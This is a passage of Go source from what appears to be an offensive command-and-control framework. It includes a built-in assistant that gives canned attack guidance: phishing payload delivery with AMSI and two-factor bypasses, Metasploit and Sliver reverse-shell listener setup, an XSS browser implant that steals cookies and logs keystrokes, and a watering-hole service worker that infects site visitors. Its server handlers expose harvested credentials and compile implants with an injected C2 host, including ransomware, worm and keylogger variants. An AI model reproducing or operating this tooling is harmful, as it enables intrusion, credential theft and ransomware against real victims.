  Email:            SMTP relay via compromised creds, BCC to external`

	case strings.Contains(lower, "phish") || strings.Contains(lower, "delivery") || strings.Contains(lower, "payload"):
		return `Payload delivery options:
  Office macros:    VBA + AMSI bypass + reflective shellcode loader
  HTML smuggling:   JS blob → download on page open
  LNK file:         Shortcut → powershell IEX (one-liner loader)
  ISO/VHD:          Mount → LNK → execute (bypasses MoTW)
  Phishing kit:     GoPhish + cloned portal + EvilGinx2 (2FA bypass)`

	case strings.Contains(lower, "c2") || strings.Contains(lower, "listener") || strings.Contains(lower, "beacon"):
		return `C2 setup guidance:
  Sliver (open source):
    sliver-server → generate --mtls --os windows -o payload.exe
    mtls → jobs → generate implant
  
  Metasploit:
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_https
    set LHOST <your-ip>; set LPORT 443; run -j

  Profile: use HTTPS on 443, randomised jitter, sleep 60s
  Domain fronting or CDN relay for attribution resistance`

	case strings.Contains(lower, "phantom") || strings.Contains(lower, "xss") || strings.Contains(lower, "browser"):
		return `Phantom XSS Browser Implant system:
  How it works:
    1. Use "exploit/phantom_xss" in Terminal to generate an XSS payload
    2. Inject payload into target web app (stored XSS, reflected, DOM)
    3. When victim visits the page, JS implant phones home to C2
    4. Implant is registered in Browser → Mesh Network panel
    5. Execute Phantom Actions: steal cookies, keylog, screenshot, SOCKS5

  Watering hole:
    Use "Watering Hole Deploy" with a target URL — injects service worker
    that silently infects all visitors to that domain`

	case strings.Contains(lower, "ollama") || strings.Contains(lower, "model") || strings.Contains(lower, "ai") || lower == "status":
		return `Specter AI status:
  Current mode: LOCAL FALLBACK (keyword matching, no LLM)
  
  To enable full AI:
    1. Install Ollama: curl -fsSL https://ollama.com/install.sh | sh
    2. Pull a model:  ollama pull llama3.2  (or mistral, codellama)
    3. Start server:  ollama serve
    4. Restart Vesper: ./vesper dashboard
  
  The Python bridge will auto-detect Ollama on localhost:11434
  and route all AI requests through the LLM.`

	default:
		// Generic tactical response based on context
		agentCount := 0
		if s.state != nil {
			agentCount = len(s.state.GetAgents())
		}
		if agentCount > 0 {
			return fmt.Sprintf(`Specter analysis for: "%s"
  
  Campaign context: %d active agent(s) detected
  Recommended next steps:
    → Run post-exploitation chain on active sessions
    → Enumerate local network from agent foothold
    → Check for privilege escalation vectors
  
  Type "suggest" for prioritised recommendations or "help" for all commands.`, truncate(prompt, 60), agentCount)
		}
		return fmt.Sprintf(`Specter analysis for: "%s"

  No active agents detected. Suggested attack flow:
    1. Recon target scope  → "scan <ip>" or run Nmap from Terminal
    2. Identify vulns      → "analyze <target>"  
    3. Exploit + implant   → "exploit <cve>" or use Terminal console
    4. Post-exploit chain  → "privesc", "lateral", "persist"

  Type "help" for full command reference.
  Tip: Connect Ollama for real LLM-powered tactical analysis.`, truncate(prompt, 60))
	}
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}

func (s *Server) handleModules(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "GET only"})
		return
	}
	mods := s.state.GetModules()
	if mods == nil {
		writeJSON(w, http.StatusOK, []interface{}{})
		return
	}
	type ModuleResponse struct {
		Name        string   `json:"Name"`
		Type        string   `json:"Type"`
		Version     string   `json:"Version"`
		Platform    string   `json:"Platform"`
		Description string   `json:"Description"`
		OS          string   `json:"OS"`
		Rank        string   `json:"Rank"`
		Commands    []string `json:"Commands"`
	}
	var resp []ModuleResponse
	for _, m := range mods {
		resp = append(resp, ModuleResponse{
			Name: m.Name, Type: m.Type, Version: "3.2", Platform: m.OS,
			Description: m.Description, OS: m.OS, Rank: m.Rank,
			Commands: []string{m.Name + "_start", m.Name + "_stop"},
		})
	}
	writeJSON(w, http.StatusOK, resp)
}

func (s *Server) handleModulePush(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "POST only"})
		return
	}
	var req struct {
		Module  string `json:"module"`
		AgentID string `json:"agent_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid JSON"})
		return
	}
	if req.Module == "" || req.AgentID == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "module and agent_id required"})
		return
	}
	writeJSON(w, http.StatusOK, map[string]string{"status": "pushed", "module": req.Module, "agent": req.AgentID})
}

func (s *Server) handleSessions(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "GET only"})
		return
	}
	agents := s.state.GetAgents()
	type SessionResponse struct {
		ID       string `json:"ID"`
		Hostname string `json:"Hostname"`
		Username string `json:"Username"`
		OS       string `json:"OS"`
		State    string `json:"State"`
	}
	var resp []SessionResponse
	for _, a := range agents {
		resp = append(resp, SessionResponse{
			ID: a.ID, Hostname: a.Hostname,
			Username: a.Username, OS: a.OS, State: "active",
		})
	}
	writeJSON(w, http.StatusOK, resp)
}

func (s *Server) handleCreds(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "GET only"})
		return
	}
	creds := s.state.GetCreds()
	if creds == nil {
		writeJSON(w, http.StatusOK, []interface{}{})
		return
	}
	type CredResponse struct {
		Username string `json:"Username"`
		Domain   string `json:"Domain"`
		Source   string `json:"Source"`
		Password string `json:"Password"`
	}
	var resp []CredResponse
	for _, c := range creds {
		resp = append(resp, CredResponse{
			Username: c.Username, Domain: c.Domain, Source: c.Source, Password: c.Password,
		})
	}
	writeJSON(w, http.StatusOK, resp)
}

func (s *Server) handleAIConfig(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		writeJSON(w, http.StatusOK, map[string]interface{}{
			"model":       s.cfg.AI.Model,
			"ollama_host": s.cfg.AI.OllamaHost,
			"ollama_port": s.cfg.AI.OllamaPort,
			"temperature": s.cfg.AI.Temperature,
			"enabled":     s.cfg.AI.Enabled,
		})
		return
	}

	if r.Method == http.MethodPut {
		var req struct {
			Model       string  `json:"model"`
			Temperature float64 `json:"temperature"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			writeError(w, http.StatusBadRequest, "Invalid request body")
			return
		}

		if req.Model != "" {
			s.cfg.AI.Model = req.Model
			// Force reload in Python Bridge if connected
			if s.state != nil && s.state.Bridge != nil && s.state.Bridge.Connected() {
				// We don't have a direct hot-reload endpoint in bridge yet, but we update the config
				// The bridge gets model from options during inference, so this takes effect immediately
				s.log.Infof("AI Model dynamically updated to: %s", req.Model)
			}
		}
		if req.Temperature > 0 {
			s.cfg.AI.Temperature = req.Temperature
		}

		writeJSON(w, http.StatusOK, map[string]string{"status": "success"})
		return
	}

	writeError(w, http.StatusMethodNotAllowed, "Method not allowed")
}

func (s *Server) handlePayloadGenerate(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeError(w, http.StatusMethodNotAllowed, "Method not allowed")
		return
	}

	var req struct {
		OS      string `json:"os"`
		Arch    string `json:"arch"`
		Format  string `json:"format"`
		Lhost   string `json:"lhost"`
		Lport   int    `json:"lport"`
		Amsi    bool   `json:"amsi"`
		Unhook  bool   `json:"unhook"`
		Encoder string `json:"encoder"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "Invalid request body")
		return
	}

	s.log.Infof("Payload generation requested: %s/%s format=%s lhost=%s:%d", req.OS, req.Arch, req.Format, req.Lhost, req.Lport)

	logs := []string{}

	// Build the actual go binary
	targetOS := strings.ToLower(req.OS)
	if targetOS == "macos" {
		targetOS = "darwin"
	}

	targetArch := req.Arch
	switch targetArch {
	case "x64":
		targetArch = "amd64"
	case "x86":
		targetArch = "386"
	}

	outName := fmt.Sprintf("vesper_%s_%s", targetOS, targetArch)
	if targetOS == "windows" {
		outName += ".exe"
	}
	outPath := filepath.Join("dist", outName)

	// Ensure dist directory exists
	os.MkdirAll("dist", 0755)

	// Prepare ldflags for variable injection
	lportStr := fmt.Sprintf("%d", req.Lport)
	stealthFlag := "false"
	if req.Amsi || req.Unhook {
		stealthFlag = "true"
	}

	payloadType := "shell"
	if req.Format == "ransomware" || req.Format == "worm" || req.Format == "keylogger" {
		payloadType = req.Format
	}

	ldflags := fmt.Sprintf("-s -w -X main.C2Host=%s -X main.C2Port=%s -X main.PayloadType=%s -X main.Stealth=%s",
		req.Lhost, lportStr, payloadType, stealthFlag)

	logs = append(logs, fmt.Sprintf("Executing compiler: go build -o %s -ldflags=\"%s\"", outPath, ldflags))

	buildCmd := exec.Command("go", "build", "-o", outPath, "-ldflags", ldflags, "./cmd/implant")
	buildCmd.Env = append(os.Environ(),
		"GOOS="+targetOS,
		"GOARCH="+targetArch,
		"CGO_ENABLED=0",
	)

	out, err := buildCmd.CombinedOutput()
	if err != nil {
		s.log.Errorf("Compilation failed: %v\n%s", err, string(out))
		writeError(w, http.StatusInternalServerError, fmt.Sprintf("Compilation failed: %s", string(out)))
		return
	}

	logs = append(logs, "Compilation successful. Reading binary payload...")

	// Read compiled binary
	binData, err := os.ReadFile(outPath)
	if err != nil {
		s.log.Errorf("Failed to read compiled binary: %v", err)
		writeError(w, http.StatusInternalServerError, "Failed to read compiled payload")
		return
	}

	// Format output size
	var sizeStr string
	size := len(binData)
	if size < 1024*1024 {
		sizeStr = fmt.Sprintf("%.1f KB", float64(size)/1024)
	} else {
		sizeStr = fmt.Sprintf("%.2f MB", float64(size)/(1024*1024))
	}

	logs = append(logs, fmt.Sprintf("Payload size: %s. Encoding to Base64...", sizeStr))

	// Encode to base64 for frontend delivery
	encodedB64 := base64.StdEncoding.EncodeToString(binData)

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"status": "success",
		"size":   sizeStr,
		"b64":    encodedB64,
		"logs":   logs,
	})
}
